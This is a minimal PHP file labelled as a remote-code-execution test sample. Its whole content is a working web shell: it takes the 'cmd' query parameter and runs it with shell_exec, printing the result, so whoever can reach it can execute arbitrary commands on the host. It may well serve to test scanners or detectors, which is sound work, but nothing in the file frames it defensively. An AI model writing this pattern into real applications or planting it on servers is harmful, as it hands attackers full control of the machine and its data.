<?php
// RCE test variation #409
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>